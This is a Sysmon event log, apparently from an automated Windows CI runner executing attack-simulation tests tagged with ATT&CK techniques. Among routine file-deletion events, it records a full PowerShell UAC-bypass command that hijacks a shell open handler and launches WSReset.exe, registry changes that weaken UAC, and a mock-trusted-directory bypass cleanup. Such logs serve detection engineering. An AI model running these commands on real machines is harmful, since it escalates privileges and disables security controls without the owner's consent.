"12/17/2025 8:02:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:58.691
ProcessGuid: {f995aebf-63b2-6942-6306-000000000e00}
ProcessId: 9340
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:56 AM","13","Registry value set:
RuleName: T1562.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:56.706
ProcessGuid: {f995aebf-63b0-6942-5b06-000000000e00}
ProcessId: 2016
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Security Center\UACDisableNotify
Details: DWORD (0x00000000)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:56 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:56.296
ProcessGuid: {f995aebf-63b0-6942-5706-000000000e00}
ProcessId: 3596
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_evapubpa.u3o.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:55.815
ProcessGuid: {f995aebf-63af-6942-5506-000000000e00}
ProcessId: 3580
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cetzjjwu.lf4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:55.349
ProcessGuid: {f995aebf-63af-6942-5306-000000000e00}
ProcessId: 8564
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rh50kaw3.yzh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:54.954
ProcessGuid: {f995aebf-63ae-6942-5106-000000000e00}
ProcessId: 8204
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_50tgzeuy.k2b.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:54.591
ProcessGuid: {f995aebf-63ae-6942-4f06-000000000e00}
ProcessId: 1076
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nekg42tc.w0m.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:54.228
ProcessGuid: {f995aebf-63ae-6942-4d06-000000000e00}
ProcessId: 3632
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wna1n4fl.y3d.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:53.861
ProcessGuid: {f995aebf-63ad-6942-4b06-000000000e00}
ProcessId: 1408
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ifs11muu.qfn.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:53.402
ProcessGuid: {f995aebf-63ad-6942-4a06-000000000e00}
ProcessId: 8068
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5pri4w4y.v5p.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:52 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:52.928
ProcessGuid: {f995aebf-63ac-6942-4706-000000000e00}
ProcessId: 1600
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dgsq1fvm.rws.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:52 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:52.462
ProcessGuid: {f995aebf-63ac-6942-4406-000000000e00}
ProcessId: 7688
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nkafaudr.krc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:51.991
ProcessGuid: {f995aebf-63ab-6942-4106-000000000e00}
ProcessId: 6712
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tos54vtd.0s3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:51.530
ProcessGuid: {f995aebf-63ab-6942-3e06-000000000e00}
ProcessId: 5812
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_brcfvnx3.rk0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:51.052
ProcessGuid: {f995aebf-63aa-6942-3b06-000000000e00}
ProcessId: 7408
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_323jwofa.zne.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:50.581
ProcessGuid: {f995aebf-63aa-6942-3806-000000000e00}
ProcessId: 8660
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zsoth1zo.3eo.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:50.002
ProcessGuid: {f995aebf-63a9-6942-3506-000000000e00}
ProcessId: 516
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mpe4s1ps.bga.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:49 AM","13","Registry value set:
RuleName: T1548.002
EventType: SetValue
UtcTime: 2025-12-17 08:02:49.501
ProcessGuid: {f995aebf-63a9-6942-3006-000000000e00}
ProcessId: 10072
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
Details: DWORD (0x00000001)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteKey
UtcTime: 2025-12-17 08:02:49.274
ProcessGuid: {f995aebf-63a9-6942-2c06-000000000e00}
ProcessId: 2320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteKey
UtcTime: 2025-12-17 08:02:49.274
ProcessGuid: {f995aebf-63a9-6942-2c06-000000000e00}
ProcessId: 2320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteKey
UtcTime: 2025-12-17 08:02:49.274
ProcessGuid: {f995aebf-63a9-6942-2c06-000000000e00}
ProcessId: 2320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open\command
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:49.102
ProcessGuid: {f995aebf-63a9-6942-2c06-000000000e00}
ProcessId: 2320
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4zvw02em.hcj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:48.818
ProcessGuid: {f995aebf-63a8-6942-2a06-000000000e00}
ProcessId: 7284
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Windows \System32\mmc.exe
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
IsExecutable: true
Archived: true"
"12/17/2025 8:02:48 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:48.796
ProcessGuid: {f995aebf-63a8-6942-2a06-000000000e00}
ProcessId: 7284
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c rd ""\\?\C:\Windows \"" /S /Q >nul 2>nul & del ""c:\testbypass.exe"" >nul 2>nul
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:48.417
ProcessGuid: {f995aebf-63a8-6942-2806-000000000e00}
ProcessId: 7552
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4hdqydk2.gs5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:47.939
ProcessGuid: {f995aebf-63a7-6942-2606-000000000e00}
ProcessId: 1492
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0kasel20.bak.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:47.245
ProcessGuid: {f995aebf-63a7-6942-2106-000000000e00}
ProcessId: 4280
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sn41xew5.sjw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:46.665
ProcessGuid: {f995aebf-63a6-6942-1d06-000000000e00}
ProcessId: 4416
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:46.646
ProcessGuid: {f995aebf-63a6-6942-1c06-000000000e00}
ProcessId: 6748
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:41 AM","13","Registry value set:
RuleName: T1562.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:41.587
ProcessGuid: {f995aebf-63a1-6942-1606-000000000e00}
ProcessId: 3888
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Security Center\UACDisableNotify
Details: DWORD (0x00000001)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:41.120
ProcessGuid: {f995aebf-63a1-6942-1206-000000000e00}
ProcessId: 6500
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yvpbjdkv.vhy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:40 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 08:02:40.837
ProcessGuid: {f995aebf-63a0-6942-0f06-000000000e00}
ProcessId: 7444
Image: C:\Windows\System32\WSReset.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{E44E9428-BDBC-4987-A099-40DC8FD255E7} {7F9185B0-CB92-43C5-80A9-92277A4F7B54} 0xFFFF
Details: Binary Data
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:40 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:40.837
ProcessGuid: {f995aebf-63a0-6942-0f06-000000000e00}
ProcessId: 7444
Image: C:\Windows\System32\WSReset.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:40.805
ProcessGuid: {f995aebf-63a0-6942-0f06-000000000e00}
ProcessId: 7444
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WSReset.exe
TargetFilename: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\InstallService\{C8A655A7-3983-4608-833C-9CD590D2D6ED}.catalogItem
Hashes: SHA256=6C0058E7632492FF2AC90EA5E2676010FD134F5D17A52D6716F228D75A048A44
IsExecutable: false
Archived: true"
"12/17/2025 8:02:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:40.799
ProcessGuid: {f995aebf-63a0-6942-0f06-000000000e00}
ProcessId: 7444
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WSReset.exe
TargetFilename: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\InstallService\{A9DB25C2-475B-4D49-9DB0-2C9D44302DBA}.catalogItem
Hashes: SHA256=20112C3FF2695F749095929D8D79338F44011E880D49D38FCD116FAF9EFC9096
IsExecutable: false
Archived: true"
"12/17/2025 8:02:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:40.797
ProcessGuid: {f995aebf-63a0-6942-0f06-000000000e00}
ProcessId: 7444
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WSReset.exe
TargetFilename: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\InstallService\{8BD7BC2F-956E-4D6F-A755-1117AEFB7A84}.catalogItem
Hashes: SHA256=8F0A39FEDECAE48225D6FC8F7A595122825BDB2029597E3D2DC45B37337D0304
IsExecutable: false
Archived: true"
"12/17/2025 8:02:40 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:39.469
ProcessGuid: {f995aebf-639f-6942-0706-000000000e00}
ProcessId: 3552
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:40 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:40.690
ProcessGuid: {f995aebf-63a0-6942-0d06-000000000e00}
ProcessId: 8792
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe /c start cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:40 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:40.686
ProcessGuid: {f995aebf-63a0-6942-0d06-000000000e00}
ProcessId: 8792
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:40 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:39.473
ProcessGuid: {f995aebf-639f-6942-0706-000000000e00}
ProcessId: 3552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52198
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:40.493
ProcessGuid: {f995aebf-63a0-6942-0d06-000000000e00}
ProcessId: 8792
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_k32rc5bs.25k.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:40 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:40.402
ProcessGuid: {f995aebf-63a0-6942-0d06-000000000e00}
ProcessId: 8792
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Force | Out-Null
New-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force | Out-Null
Set-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe /c start cmd.exe\"""" -Force -ErrorAction SilentlyContinue | Out-Null
$Process = Start-Process -FilePath \""""C:\Windows\System32\WSReset.exe\"""" -WindowStyle Hidden}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:39.962
ProcessGuid: {f995aebf-639f-6942-0906-000000000e00}
ProcessId: 1192
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_scgkpioc.d0x.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:39 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:38.561
ProcessGuid: {f995aebf-639e-6942-0506-000000000e00}
ProcessId: 6388
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:38.565
ProcessGuid: {f995aebf-639e-6942-0506-000000000e00}
ProcessId: 6388
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52196
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:39 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:39.480
ProcessGuid: {f995aebf-639f-6942-0706-000000000e00}
ProcessId: 3552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:39.258
ProcessGuid: {f995aebf-639f-6942-0706-000000000e00}
ProcessId: 3552
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0yfehngs.ujm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:39.163
ProcessGuid: {f995aebf-639f-6942-0706-000000000e00}
ProcessId: 3552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
